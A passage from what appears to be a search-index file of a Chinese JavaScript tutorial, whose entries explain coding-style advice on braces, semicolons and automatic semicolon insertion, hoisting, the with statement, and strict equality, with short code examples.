\uff0c\u4ee3\u7801\u53d8\u5f97\u66f4\u6e05\u6670\u4e86\u3002 \u5efa\u8bae\u81ea\u589e\uff08 ++ \uff09\u548c\u81ea\u51cf\uff08 -- \uff09\u8fd0\u7b97\u7b26\u5c3d\u91cf\u4f7f\u7528 += \u548c -= \u4ee3\u66ff\u3002 switch...case \u7ed3\u6784 \u00b6 switch...case \u7ed3\u6784\u8981\u6c42\uff0c\u5728\u6bcf\u4e00\u4e2a case \u7684\u6700\u540e\u4e00\u884c\u5fc5\u987b\u662f break \u8bed\u53e5\uff0c\u5426\u5219\u4f1a\u63a5\u7740\u8fd0\u884c\u4e0b\u4e00\u4e2a case \u3002\u8fd9\u6837\u4e0d\u4ec5\u5bb9\u6613\u5fd8\u8bb0\uff0c\u8fd8\u4f1a\u9020\u6210\u4ee3\u7801\u7684\u5197\u957f\u3002 \u800c\u4e14\uff0c switch...case \u4e0d\u4f7f\u7528\u5927\u62ec\u53f7\uff0c\u4e0d\u5229\u4e8e\u4ee3\u7801\u5f62\u5f0f\u7684\u7edf\u4e00\u3002\u6b64\u5916\uff0c\u8fd9\u79cd\u7ed3\u6784\u7c7b\u4f3c\u4e8e goto \u8bed\u53e5\uff0c\u5bb9\u6613\u9020\u6210\u7a0b\u5e8f\u6d41\u7a0b\u7684\u6df7\u4e71\uff0c\u4f7f\u5f97\u4ee3\u7801\u7ed3\u6784\u6df7\u4e71\u4e0d\u582a\uff0c\u4e0d\u7b26\u5408\u9762\u5411\u5bf9\u8c61\u7f16\u7a0b\u7684\u539f\u5219\u3002 1 2 3 4 5 6 7 8 9 10 11 12 function doAction ( action ) { switch ( action ) { case 'hack' : return 'hack' ; case 'slash' : return 'slash' ; case 'run' : return 'run' ; default : throw new Error ( 'Invalid action.' ); } } \u4e0a\u9762\u7684\u4ee3\u7801\u5efa\u8bae\u6539\u5199\u6210\u5bf9\u8c61\u7ed3\u6784\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 function doAction ( action ) { var actions = { 'hack' : function () { return 'hack' ; }, 'slash' : function () { return 'slash' ; }, 'run' : function () { return 'run' ; } }; if ( typeof actions [ action ] !== 'function' ) { throw new Error ( 'Invalid action.' ); } return actions [ action ](); } \u56e0\u6b64\uff0c\u5efa\u8bae switch...case \u7ed3\u6784\u53ef\u4ee5\u7528\u5bf9\u8c61\u7ed3\u6784\u4ee3\u66ff\u3002 \u53c2\u8003\u94fe\u63a5 \u00b6 Eric Elliott, Programming JavaScript Applications, Chapter 2. JavaScript Style Guide , O'Reilly, 2013 Axel Rauschmayer, A meta style guide for JavaScript Axel Rauschmayer, Automatic semicolon insertion in JavaScript Rod Vagg, JavaScript and Semicolons","title":"\u7f16\u7a0b\u98ce\u683c"},{"location":"features/style/#_1","text":"","title":"\u7f16\u7a0b\u98ce\u683c"},{"location":"features/style/#_2","text":"\u201c\u7f16\u7a0b\u98ce\u683c\u201d\uff08programming style\uff09\u6307\u7684\u662f\u7f16\u5199\u4ee3\u7801\u7684\u6837\u5f0f\u89c4\u5219\u3002\u4e0d\u540c\u7684\u7a0b\u5e8f\u5458\uff0c\u5f80\u5f80\u6709\u4e0d\u540c\u7684\u7f16\u7a0b\u98ce\u683c\u3002 \u6709\u4eba\u8bf4\uff0c\u7f16\u8bd1\u5668\u7684\u89c4\u8303\u53eb\u505a\u201c\u8bed\u6cd5\u89c4\u5219\u201d\uff08grammar\uff09\uff0c\u8fd9\u662f\u7a0b\u5e8f\u5458\u5fc5\u987b\u9075\u5b88\u7684\uff1b\u800c\u7f16\u8bd1\u5668\u5ffd\u7565\u7684\u90e8\u5206\uff0c\u5c31\u53eb\u201c\u7f16\u7a0b\u98ce\u683c\u201d\uff08programming style\uff09\uff0c\u8fd9\u662f\u7a0b\u5e8f\u5458\u53ef\u4ee5\u81ea\u7531\u9009\u62e9\u7684\u3002\u8fd9\u79cd\u8bf4\u6cd5\u4e0d\u5b8c\u5168\u6b63\u786e\uff0c\u7a0b\u5e8f\u5458\u56fa\u7136\u53ef\u4ee5\u81ea\u7531\u9009\u62e9\u7f16\u7a0b\u98ce\u683c\uff0c\u4f46\u662f\u597d\u7684\u7f16\u7a0b\u98ce\u683c\u6709\u52a9\u4e8e\u5199\u51fa\u8d28\u91cf\u66f4\u9ad8\u3001\u9519\u8bef\u66f4\u5c11\u3001\u66f4\u6613\u4e8e\u7ef4\u62a4\u7684\u7a0b\u5e8f\u3002 \u6240\u4ee5\uff0c\u7f16\u7a0b\u98ce\u683c\u7684\u9009\u62e9\u4e0d\u5e94\u8be5\u57fa\u4e8e\u4e2a\u4eba\u7231\u597d\u3001\u719f\u6089\u7a0b\u5ea6\u3001\u6253\u5b57\u91cf\u7b49\u56e0\u7d20\uff0c\u800c\u8981\u8003\u8651\u5982\u4f55\u5c3d\u91cf\u4f7f\u4ee3\u7801\u6e05\u6670\u6613\u8bfb\u3001\u51cf\u5c11\u51fa\u9519\u3002\u4f60\u9009\u62e9\u7684\uff0c\u4e0d\u662f\u4f60\u559c\u6b22\u7684\u98ce\u683c\uff0c\u800c\u662f\u4e00\u79cd\u80fd\u591f\u6e05\u6670\u8868\u8fbe\u4f60\u7684\u610f\u56fe\u7684\u98ce\u683c\u3002\u8fd9\u4e00\u70b9\uff0c\u5bf9\u4e8e JavaScript \u8fd9\u79cd\u8bed\u6cd5\u81ea\u7531\u5ea6\u5f88\u9ad8\u7684\u8bed\u8a00\u5c24\u5176\u91cd\u8981\u3002 \u5fc5\u987b\u7262\u8bb0\u7684\u4e00\u70b9\u662f\uff0c\u5982\u679c\u4f60\u9009\u5b9a\u4e86\u4e00\u79cd\u201c\u7f16\u7a0b\u98ce\u683c\u201d\uff0c\u5c31\u5e94\u8be5\u575a\u6301\u9075\u5b88\uff0c\u5207\u5fcc\u591a\u79cd\u98ce\u683c\u6df7\u7528\u3002\u5982\u679c\u4f60\u52a0\u5165\u4ed6\u4eba\u7684\u9879\u76ee\uff0c\u5c31\u5e94\u8be5\u9075\u5b88\u73b0\u6709\u7684\u98ce\u683c\u3002","title":"\u6982\u8ff0"},{"location":"features/style/#_3","text":"\u884c\u9996\u7684\u7a7a\u683c\u548c Tab \u952e\uff0c\u90fd\u53ef\u4ee5\u4ea7\u751f\u4ee3\u7801\u7f29\u8fdb\u6548\u679c\uff08indent\uff09\u3002 Tab \u952e\u53ef\u4ee5\u8282\u7701\u51fb\u952e\u6b21\u6570\uff0c\u4f46\u4e0d\u540c\u7684\u6587\u672c\u7f16\u8f91\u5668\u5bf9 Tab \u7684\u663e\u793a\u4e0d\u5c3d\u76f8\u540c\uff0c\u6709\u7684\u663e\u793a\u56db\u4e2a\u7a7a\u683c\uff0c\u6709\u7684\u663e\u793a\u4e24\u4e2a\u7a7a\u683c\uff0c\u6240\u4ee5\u6709\u4eba\u89c9\u5f97\uff0c\u7a7a\u683c\u952e\u53ef\u4ee5\u4f7f\u5f97\u663e\u793a\u6548\u679c\u66f4\u7edf\u4e00\u3002 \u65e0\u8bba\u4f60\u9009\u62e9\u54ea\u4e00\u79cd\u65b9\u6cd5\uff0c\u90fd\u662f\u53ef\u4ee5\u63a5\u53d7\u7684\uff0c\u8981\u505a\u7684\u5c31\u662f\u59cb\u7ec8\u575a\u6301\u8fd9\u4e00\u79cd\u9009\u62e9\u3002\u4e0d\u8981\u4e00\u4f1a\u4f7f\u7528 Tab \u952e\uff0c\u4e00\u4f1a\u4f7f\u7528\u7a7a\u683c\u952e\u3002","title":"\u7f29\u8fdb"},{"location":"features/style/#_4","text":"\u5982\u679c\u5faa\u73af\u548c\u5224\u65ad\u7684\u4ee3\u7801\u4f53\u53ea\u6709\u4e00\u884c\uff0cJavaScript \u5141\u8bb8\u8be5\u533a\u5757\uff08block\uff09\u7701\u7565\u5927\u62ec\u53f7\u3002 1 2 3 if ( a ) b (); c (); \u4e0a\u9762\u4ee3\u7801\u7684\u539f\u610f\u53ef\u80fd\u662f\u4e0b\u9762\u8fd9\u6837\u3002 1 2 3 4 if ( a ) { b (); c (); } \u4f46\u662f\uff0c\u5b9e\u9645\u6548\u679c\u5374\u662f\u4e0b\u9762\u8fd9\u6837\u3002 1 2 3 4 if ( a ) { b (); } c (); \u56e0\u6b64\uff0c\u5efa\u8bae\u603b\u662f\u4f7f\u7528\u5927\u62ec\u53f7\u8868\u793a\u533a\u5757\u3002 \u53e6\u5916\uff0c\u533a\u5757\u8d77\u9996\u7684\u5927\u62ec\u53f7\u7684\u4f4d\u7f6e\uff0c\u6709\u8bb8\u591a\u4e0d\u540c\u7684\u5199\u6cd5\u3002\u6700\u6d41\u884c\u7684\u6709\u4e24\u79cd\uff0c\u4e00\u79cd\u662f\u8d77\u9996\u7684\u5927\u62ec\u53f7\u53e6\u8d77\u4e00\u884c\u3002 1 2 3 4 block { // ... } \u53e6\u4e00\u79cd\u662f\u8d77\u9996\u7684\u5927\u62ec\u53f7\u8ddf\u5728\u5173\u952e\u5b57\u7684\u540e\u9762\u3002 1 2 3 block { // ... } \u4e00\u822c\u6765\u8bf4\uff0c\u8fd9\u4e24\u79cd\u5199\u6cd5\u90fd\u53ef\u4ee5\u63a5\u53d7\u3002\u4f46\u662f\uff0cJavaScript \u8981\u4f7f\u7528\u540e\u4e00\u79cd\uff0c\u56e0\u4e3a JavaScript \u4f1a\u81ea\u52a8\u6dfb\u52a0\u53e5\u672b\u7684\u5206\u53f7\uff0c\u5bfc\u81f4\u4e00\u4e9b\u96be\u4ee5\u5bdf\u89c9\u7684\u9519\u8bef\u3002 1 2 3 4 5 6 7 8 9 10 return { key : value }; // \u76f8\u5f53\u4e8e return ; { key : value }; \u4e0a\u9762\u7684\u4ee3\u7801\u7684\u539f\u610f\uff0c\u662f\u8981\u8fd4\u56de\u4e00\u4e2a\u5bf9\u8c61\uff0c\u4f46\u5b9e\u9645\u4e0a\u8fd4\u56de\u7684\u662f undefined \uff0c\u56e0\u4e3a JavaScript \u81ea\u52a8\u5728 return \u8bed\u53e5\u540e\u9762\u6dfb\u52a0\u4e86\u5206\u53f7\u3002\u4e3a\u4e86\u907f\u514d\u8fd9\u4e00\u7c7b\u9519\u8bef\uff0c\u9700\u8981\u5199\u6210\u4e0b\u9762\u8fd9\u6837\u3002 1 2 3 return { key : value }; \u56e0\u6b64\uff0c\u8868\u793a\u533a\u5757\u8d77\u9996\u7684\u5927\u62ec\u53f7\uff0c\u4e0d\u8981\u53e6\u8d77\u4e00\u884c\u3002","title":"\u533a\u5757"},{"location":"features/style/#_5","text":"\u5706\u62ec\u53f7\uff08parentheses\uff09\u5728 JavaScript \u4e2d\u6709\u4e24\u79cd\u4f5c\u7528\uff0c\u4e00\u79cd\u8868\u793a\u51fd\u6570\u7684\u8c03\u7528\uff0c\u53e6\u4e00\u79cd\u8868\u793a\u8868\u8fbe\u5f0f\u7684\u7ec4\u5408\uff08grouping\uff09\u3002 1 2 3 4 5 // \u5706\u62ec\u53f7\u8868\u793a\u51fd\u6570\u7684\u8c03\u7528 console . log ( 'abc' ); // \u5706\u62ec\u53f7\u8868\u793a\u8868\u8fbe\u5f0f\u7684\u7ec4\u5408 ( 1 + 2 ) * 3 \u5efa\u8bae\u53ef\u4ee5\u7528\u7a7a\u683c\uff0c\u533a\u5206\u8fd9\u4e24\u79cd\u4e0d\u540c\u7684\u62ec\u53f7\u3002 \u8868\u793a\u51fd\u6570\u8c03\u7528\u65f6\uff0c\u51fd\u6570\u540d\u4e0e\u5de6\u62ec\u53f7\u4e4b\u95f4\u6ca1\u6709\u7a7a\u683c\u3002 \u8868\u793a\u51fd\u6570\u5b9a\u4e49\u65f6\uff0c\u51fd\u6570\u540d\u4e0e\u5de6\u62ec\u53f7\u4e4b\u95f4\u6ca1\u6709\u7a7a\u683c\u3002 \u5176\u4ed6\u60c5\u51b5\u65f6\uff0c\u524d\u9762\u4f4d\u7f6e\u7684\u8bed\u6cd5\u5143\u7d20\u4e0e\u5de6\u62ec\u53f7\u4e4b\u95f4\uff0c\u90fd\u6709\u4e00\u4e2a\u7a7a\u683c\u3002 \u6309\u7167\u4e0a\u9762\u7684\u89c4\u5219\uff0c\u4e0b\u9762\u7684\u5199\u6cd5\u90fd\u662f\u4e0d\u89c4\u8303\u7684\u3002 1 2 3 4 5 foo ( bar ) return ( a + b ); if ( a === 0 ) {...} function foo ( b ) {...} function ( x ) {...} \u4e0a\u9762\u4ee3\u7801\u7684\u6700\u540e\u4e00\u884c\u662f\u4e00\u4e2a\u533f\u540d\u51fd\u6570\uff0c function \u662f\u8bed\u6cd5\u5173\u952e\u5b57\uff0c\u4e0d\u662f\u51fd\u6570\u540d\uff0c\u6240\u4ee5\u4e0e\u5de6\u62ec\u53f7\u4e4b\u95f4\u5e94\u8be5\u8981\u6709\u4e00\u4e2a\u7a7a\u683c\u3002","title":"\u5706\u62ec\u53f7"},{"location":"features/style/#_6","text":"\u5206\u53f7\u8868\u793a\u4e00\u6761\u8bed\u53e5\u7684\u7ed3\u675f\u3002JavaScript \u5141\u8bb8\u7701\u7565\u884c\u5c3e\u7684\u5206\u53f7\u3002\u4e8b\u5b9e\u4e0a\uff0c\u786e\u5b9e\u6709\u4e00\u4e9b\u5f00\u53d1\u8005\u884c\u5c3e\u4ece\u6765\u4e0d\u5199\u5206\u53f7\u3002\u4f46\u662f\uff0c\u7531\u4e8e\u4e0b\u9762\u8981\u8ba8\u8bba\u7684\u539f\u56e0\uff0c\u5efa\u8bae\u8fd8\u662f\u4e0d\u8981\u7701\u7565\u8fd9\u4e2a\u5206\u53f7\u3002","title":"\u884c\u5c3e\u7684\u5206\u53f7"},{"location":"features/style/#_7","text":"\u9996\u5148\uff0c\u4ee5\u4e0b\u4e09\u79cd\u60c5\u51b5\uff0c\u8bed\u6cd5\u89c4\u5b9a\u672c\u6765\u5c31\u4e0d\u9700\u8981\u5728\u7ed3\u5c3e\u6dfb\u52a0\u5206\u53f7\u3002 \uff081\uff09for \u548c while \u5faa\u73af 1 2 3 4 5 for ( ; ; ) { } // \u6ca1\u6709\u5206\u53f7 while ( true ) { } // \u6ca1\u6709\u5206\u53f7 \u6ce8\u610f\uff0c do...while \u5faa\u73af\u662f\u6709\u5206\u53f7\u7684\u3002 1 2 3 do { a -- ; } while ( a > 0 ); // \u5206\u53f7\u4e0d\u80fd\u7701\u7565 \uff082\uff09\u5206\u652f\u8bed\u53e5\uff1aif\uff0cswitch\uff0ctry 1 2 3 4 5 6 7 8 9 if ( true ) { } // \u6ca1\u6709\u5206\u53f7 switch () { } // \u6ca1\u6709\u5206\u53f7 try { } catch { } // \u6ca1\u6709\u5206\u53f7 \uff083\uff09\u51fd\u6570\u7684\u58f0\u660e\u8bed\u53e5 1 2 function f () { } // \u6ca1\u6709\u5206\u53f7 \u6ce8\u610f\uff0c\u51fd\u6570\u8868\u8fbe\u5f0f\u4ecd\u7136\u8981\u4f7f\u7528\u5206\u53f7\u3002 1 2 var f = function f () { }; \u4ee5\u4e0a\u4e09\u79cd\u60c5\u51b5\uff0c\u5982\u679c\u4f7f\u7528\u4e86\u5206\u53f7\uff0c\u5e76\u4e0d\u4f1a\u51fa\u9519\u3002\u56e0\u4e3a\uff0c\u89e3\u91ca\u5f15\u64ce\u4f1a\u628a\u8fd9\u4e2a\u5206\u53f7\u89e3\u91ca\u4e3a\u7a7a\u8bed\u53e5\u3002","title":"\u4e0d\u4f7f\u7528\u5206\u53f7\u7684\u60c5\u51b5"},{"location":"features/style/#_8","text":"\u9664\u4e86\u4e0a\u4e00\u8282\u7684\u4e09\u79cd\u60c5\u51b5\uff0c\u6240\u6709\u8bed\u53e5\u90fd\u5e94\u8be5\u4f7f\u7528\u5206\u53f7\u3002\u4f46\u662f\uff0c\u5982\u679c\u6ca1\u6709\u4f7f\u7528\u5206\u53f7\uff0c\u5927\u591a\u6570\u60c5\u51b5\u4e0b\uff0cJavaScript \u4f1a\u81ea\u52a8\u6dfb\u52a0\u3002 1 2 3 var a = 1 // \u7b49\u540c\u4e8e var a = 1 ; \u8fd9\u79cd\u8bed\u6cd5\u7279\u6027\u88ab\u79f0\u4e3a\u201c\u5206\u53f7\u7684\u81ea\u52a8\u6dfb\u52a0\u201d\uff08Automatic Semicolon Insertion\uff0c\u7b80\u79f0 ASI\uff09\u3002 \u56e0\u6b64\uff0c\u6709\u4eba\u63d0\u5021\u7701\u7565\u53e5\u5c3e\u7684\u5206\u53f7\u3002\u9ebb\u70e6\u7684\u662f\uff0c\u5982\u679c\u4e0b\u4e00\u884c\u7684\u5f00\u59cb\u53ef\u4ee5\u4e0e\u672c\u884c\u7684\u7ed3\u5c3e\u8fde\u5728\u4e00\u8d77\u89e3\u91ca\uff0cJavaScript \u5c31\u4e0d\u4f1a\u81ea\u52a8\u6dfb\u52a0\u5206\u53f7\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 // \u7b49\u540c\u4e8e var a = 3 var a = 3 // \u7b49\u540c\u4e8e 'abc'.length 'abc' . length // \u7b49\u540c\u4e8e return a + b; return a + b ; // \u7b49\u540c\u4e8e obj.foo(arg1, arg2); obj . foo ( arg1 , arg2 ); // \u7b49\u540c\u4e8e 3 * 2 + 10 * (27 / 6) 3 * 2 + 10 * ( 27 / 6 ) \u4e0a\u9762\u4ee3\u7801\u90fd\u4f1a\u591a\u884c\u653e\u5728\u4e00\u8d77\u89e3\u91ca\uff0c\u4e0d\u4f1a\u6bcf\u4e00\u884c\u81ea\u52a8\u6dfb\u52a0\u5206\u53f7\u3002\u8fd9\u4e9b\u4f8b\u5b50\u8fd8\u662f\u6bd4\u8f83\u5bb9\u6613\u770b\u51fa\u6765\u7684\uff0c\u4f46\u662f\u4e0b\u9762\u8fd9\u4e2a\u4f8b\u5b50\u5c31\u4e0d\u90a3\u4e48\u5bb9\u6613\u770b\u51fa\u6765\u4e86\u3002 1 2 3 4 5 6 7 x = y ( function () { // ... })(); // \u7b49\u540c\u4e8e x = y ( function () {...})(); \u4e0b\u9762\u662f\u66f4\u591a\u4e0d\u4f1a\u81ea\u52a8\u6dfb\u52a0\u5206\u53f7\u7684\u4f8b\u5b50\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 // \u5f15\u64ce\u89e3\u91ca\u4e3a c(d+e) var a = b + c ( d + e ). toString (); // \u5f15\u64ce\u89e3\u91ca\u4e3a a = b/hi/g.exec(c).map(d) // \u6b63\u5219\u8868\u8fbe\u5f0f\u7684\u659c\u6760\uff0c\u4f1a\u5f53\u4f5c\u9664\u6cd5\u8fd0\u7b97\u7b26 a = b /hi/g . exec ( c ). map ( d ); // \u89e3\u91ca\u4e3a'b'['red', 'green']\uff0c // \u5373\u628a\u5b57\u7b26\u4e32\u5f53\u4f5c\u4e00\u4e2a\u6570\u7ec4\uff0c\u6309\u7d22\u5f15\u53d6\u503c var a = 'b' [ 'red' , 'green' ]. forEach ( function ( c ) { console . log ( c ); }) // \u89e3\u91ca\u4e3a function (x) { return x }(a++) // \u5373\u8c03\u7528\u533f\u540d\u51fd\u6570\uff0c\u7ed3\u679cf\u7b49\u4e8e0 var a = 0 ; var f = function ( x ) { return x } ( a ++ ) \u53ea\u6709\u4e0b\u4e00\u884c\u7684\u5f00\u59cb\u4e0e\u672c\u884c\u7684\u7ed3\u5c3e\uff0c\u65e0\u6cd5\u653e\u5728\u4e00\u8d77\u89e3\u91ca\uff0cJavaScript \u5f15\u64ce\u624d\u4f1a\u81ea\u52a8\u6dfb\u52a0\u5206\u53f7\u3002 1 2 3 4 5 6 7 if ( a < 0 ) a = 0 console . log ( a ) // \u7b49\u540c\u4e8e\u4e0b\u9762\u7684\u4ee3\u7801\uff0c // \u56e0\u4e3a 0console \u6ca1\u6709\u610f\u4e49 if ( a < 0 ) a = 0 ; console . log ( a ) \u53e6\u5916\uff0c\u5982\u679c\u4e00\u884c\u7684\u8d77\u9996\u662f\u201c\u81ea\u589e\u201d\uff08 ++ \uff09\u6216\u201c\u81ea\u51cf\u201d\uff08 -- \uff09\u8fd0\u7b97\u7b26\uff0c\u5219\u5b83\u4eec\u7684\u524d\u9762\u4f1a\u81ea\u52a8\u6dfb\u52a0\u5206\u53f7\u3002 1 2 3 4 5 6 7 8 9 10 a = b = c = 1 a ++ b -- c console . log ( a , b , c ) // 1 2 0 \u4e0a\u9762\u4ee3\u7801\u4e4b\u6240\u4ee5\u4f1a\u5f97\u5230 1 2 0 \u7684\u7ed3\u679c\uff0c\u539f\u56e0\u662f\u81ea\u589e\u548c\u81ea\u51cf\u8fd0\u7b97\u7b26\u524d\uff0c\u81ea\u52a8\u52a0\u4e0a\u4e86\u5206\u53f7\u3002\u4e0a\u9762\u7684\u4ee3\u7801\u5b9e\u9645\u4e0a\u7b49\u540c\u4e8e\u4e0b\u9762\u7684\u5f62\u5f0f\u3002 1 2 3 4 a = b = c = 1 ; a ; ++ b ; -- c ; \u5982\u679c continue \u3001 break \u3001 return \u548c throw \u8fd9\u56db\u4e2a\u8bed\u53e5\u540e\u9762\uff0c\u76f4\u63a5\u8ddf\u6362\u884c\u7b26\uff0c\u5219\u4f1a\u81ea\u52a8\u6dfb\u52a0\u5206\u53f7\u3002\u8fd9\u610f\u5473\u7740\uff0c\u5982\u679c return \u8bed\u53e5\u8fd4\u56de\u7684\u662f\u4e00\u4e2a\u5bf9\u8c61\u7684\u5b57\u9762\u91cf\uff0c\u8d77\u9996\u7684\u5927\u62ec\u53f7\u4e00\u5b9a\u8981\u5199\u5728\u540c\u4e00\u884c\uff0c\u5426\u5219\u5f97\u4e0d\u5230\u9884\u671f\u7ed3\u679c\u3002 1 2 3 4 5 6 return { first : 'Jane' }; // \u89e3\u91ca\u6210 return ; { first : 'Jane' }; \u7531\u4e8e\u89e3\u91ca\u5f15\u64ce\u81ea\u52a8\u6dfb\u52a0\u5206\u53f7\u7684\u884c\u4e3a\u96be\u4ee5\u9884\u6d4b\uff0c\u56e0\u6b64\u7f16\u5199\u4ee3\u7801\u7684\u65f6\u5019\u4e0d\u5e94\u8be5\u7701\u7565\u884c\u5c3e\u7684\u5206\u53f7\u3002 \u4e0d\u5e94\u8be5\u7701\u7565\u7ed3\u5c3e\u7684\u5206\u53f7\uff0c\u8fd8\u6709\u4e00\u4e2a\u539f\u56e0\u3002\u6709\u4e9b JavaScript \u4ee3\u7801\u538b\u7f29\u5668\uff08uglifier\uff09\u4e0d\u4f1a\u81ea\u52a8\u6dfb\u52a0\u5206\u53f7\uff0c\u56e0\u6b64\u9047\u5230\u6ca1\u6709\u5206\u53f7\u7684\u7ed3\u5c3e\uff0c\u5c31\u4f1a\u8ba9\u4ee3\u7801\u4fdd\u6301\u539f\u72b6\uff0c\u800c\u4e0d\u662f\u538b\u7f29\u6210\u4e00\u884c\uff0c\u4f7f\u5f97\u538b\u7f29\u65e0\u6cd5\u5f97\u5230\u6700\u4f18\u7684\u7ed3\u679c\u3002 \u53e6\u5916\uff0c\u4e0d\u5199\u7ed3\u5c3e\u7684\u5206\u53f7\uff0c\u53ef\u80fd\u4f1a\u5bfc\u81f4\u811a\u672c\u5408\u5e76\u51fa\u9519\u3002\u6240\u4ee5\uff0c\u6709\u7684\u4ee3\u7801\u5e93\u5728\u7b2c\u4e00\u884c\u8bed\u53e5\u5f00\u59cb\u524d\uff0c\u4f1a\u52a0\u4e0a\u4e00\u4e2a\u5206\u53f7\u3002 1 2 ; var a = 1 ; // ... \u4e0a\u9762\u8fd9\u79cd\u5199\u6cd5\u5c31\u53ef\u4ee5\u907f\u514d\u4e0e\u5176\u4ed6\u811a\u672c\u5408\u5e76\u65f6\uff0c\u6392\u5728\u524d\u9762\u7684\u811a\u672c\u6700\u540e\u4e00\u884c\u8bed\u53e5\u6ca1\u6709\u5206\u53f7\uff0c\u5bfc\u81f4\u8fd0\u884c\u51fa\u9519\u7684\u95ee\u9898\u3002","title":"\u5206\u53f7\u7684\u81ea\u52a8\u6dfb\u52a0"},{"location":"features/style/#_9","text":"JavaScript \u6700\u5927\u7684\u8bed\u6cd5\u7f3a\u70b9\uff0c\u53ef\u80fd\u5c31\u662f\u5168\u5c40\u53d8\u91cf\u5bf9\u4e8e\u4efb\u4f55\u4e00\u4e2a\u4ee3\u7801\u5757\uff0c\u90fd\u662f\u53ef\u8bfb\u53ef\u5199\u3002\u8fd9\u5bf9\u4ee3\u7801\u7684\u6a21\u5757\u5316\u548c\u91cd\u590d\u4f7f\u7528\uff0c\u975e\u5e38\u4e0d\u5229\u3002 \u56e0\u6b64\uff0c\u5efa\u8bae\u907f\u514d\u4f7f\u7528\u5168\u5c40\u53d8\u91cf\u3002\u5982\u679c\u4e0d\u5f97\u4e0d\u4f7f\u7528\uff0c\u53ef\u4ee5\u8003\u8651\u7528\u5927\u5199\u5b57\u6bcd\u8868\u793a\u53d8\u91cf\u540d\uff0c\u8fd9\u6837\u66f4\u5bb9\u6613\u770b\u51fa\u8fd9\u662f\u5168\u5c40\u53d8\u91cf\uff0c\u6bd4\u5982 UPPER_CASE \u3002","title":"\u5168\u5c40\u53d8\u91cf"},{"location":"features/style/#_10","text":"JavaScript \u4f1a\u81ea\u52a8\u5c06\u53d8\u91cf\u58f0\u660e\u201c\u63d0\u5347\u201d\uff08hoist\uff09\u5230\u4ee3\u7801\u5757\uff08block\uff09\u7684\u5934\u90e8\u3002 1 2 3 4 5 6 7 8 9 if ( ! x ) { var x = {}; } // \u7b49\u540c\u4e8e var x ; if ( ! x ) { x = {}; } \u8fd9\u610f\u5473\u7740\uff0c\u53d8\u91cf x \u662f if \u4ee3\u7801\u5757\u4e4b\u524d\u5c31\u5b58\u5728\u4e86\u3002\u4e3a\u4e86\u907f\u514d\u53ef\u80fd\u51fa\u73b0\u7684\u95ee\u9898\uff0c\u6700\u597d\u628a\u53d8\u91cf\u58f0\u660e\u90fd\u653e\u5728\u4ee3\u7801\u5757\u7684\u5934\u90e8\u3002 1 2 3 4 5 6 7 8 9 for ( var i = 0 ; i < 10 ; i ++ ) { // ... } // \u5199\u6210 var i ; for ( i = 0 ; i < 10 ; i ++ ) { // ... } \u4e0a\u9762\u8fd9\u6837\u7684\u5199\u6cd5\uff0c\u5c31\u5bb9\u6613\u770b\u51fa\u5b58\u5728\u4e00\u4e2a\u5168\u5c40\u7684\u5faa\u73af\u53d8\u91cf i \u3002 \u53e6\u5916\uff0c\u6240\u6709\u51fd\u6570\u90fd\u5e94\u8be5\u5728\u4f7f\u7528\u4e4b\u524d\u5b9a\u4e49\u3002\u51fd\u6570\u5185\u90e8\u7684\u53d8\u91cf\u58f0\u660e\uff0c\u90fd\u5e94\u8be5\u653e\u5728\u51fd\u6570\u7684\u5934\u90e8\u3002","title":"\u53d8\u91cf\u58f0\u660e"},{"location":"features/style/#with","text":"with \u53ef\u4ee5\u51cf\u5c11\u4ee3\u7801\u7684\u4e66\u5199\uff0c\u4f46\u662f\u4f1a\u9020\u6210\u6df7\u6dc6\u3002 1 2 3 with ( o ) { \u3000 foo = bar ; } \u4e0a\u9762\u7684\u4ee3\u7801\uff0c\u53ef\u4ee5\u6709\u56db\u79cd\u8fd0\u884c\u7ed3\u679c\uff1a 1 2 3 4 o . foo = bar ; o . foo = o . bar ; foo = bar ; foo = o . bar ; \u8fd9\u56db\u79cd\u7ed3\u679c\u90fd\u53ef\u80fd\u53d1\u751f\uff0c\u53d6\u51b3\u4e8e\u4e0d\u540c\u7684\u53d8\u91cf\u662f\u5426\u6709\u5b9a\u4e49\u3002\u56e0\u6b64\uff0c\u4e0d\u8981\u4f7f\u7528 with \u8bed\u53e5\u3002","title":"with \u8bed\u53e5"},{"location":"features/style/#_11","text":"JavaScript \u6709\u4e24\u4e2a\u8868\u793a\u76f8\u7b49\u7684\u8fd0\u7b97\u7b26\uff1a\u201c\u76f8\u7b49\u201d\uff08 == \uff09\u548c\u201c\u4e25\u683c\u76f8\u7b49\u201d\uff08 === \uff09\u3002 \u76f8\u7b49\u8fd0\u7b97\u7b26\u4f1a\u81ea\u52a8\u8f6c\u6362\u53d8\u91cf\u7c7b\u578b\uff0c\u9020\u6210\u5f88\u591a\u610f\u60f3\u4e0d\u5230\u7684\u60c5\u51b5\u3002 1 2 3 4 5 6 7 0 == '' // true 1 == true // true 2 == true // false 0 == '0' // true false == 'false' // false false == '0' // true ' \\t\\r\\n ' == 0 // true \u56e0\u6b64\uff0c\u5efa\u8bae\u4e0d\u8981\u4f7f\u7528\u76f8\u7b49\u8fd0\u7b97\u7b26\uff08 == \uff09\uff0c\u53ea\u4f7f\u7528\u4e25\u683c\u76f8\u7b49\u8fd0\u7b97\u7b26\uff08 === \uff09\u3002","title":"\u76f8\u7b49\u548c\u4e25\u683c\u76f8\u7b49"},{"location":"features/style/#_12","text":"\u6709\u4e9b\u7a0b\u5e8f\u5458\u8ffd\u6c42\u7b80\u6d01\uff0c\u559c\u6b22\u5408\u5e76\u4e0d\u540c\u76ee\u7684\u7684\u8bed\u53e5\u3002\u6bd4\u5982\uff0c\u539f\u6765\u7684\u8bed\u53e5\u662f 1 2 3 4 a = b ; if ( a ) { // ... } \u4ed6\u559c\u6b22\u5199\u6210\u4e0b\u9762\u8fd9\u6837\u3002 1 2 3 if ( a = b ) { // ... } \u867d\u7136\u8bed\u53e5\u5c11\u4e86\u4e00\u884c\uff0c\u4f46\u662f\u53ef\u8bfb\u6027\u5927\u6253\u6298\u6263\uff0c\u800c\u4e14\u4f1a\u9020\u6210\u8bef\u8bfb\uff0c\u8ba9\u522b\u4eba\u8bef\u89e3\u8fd9\u884c\u4ee3\u7801\u7684\u610f\u601d\u662f\u4e0b\u9762\u8fd9\u6837\u3002 1 2 3 if \uff08 a === b \uff09 { // ... } 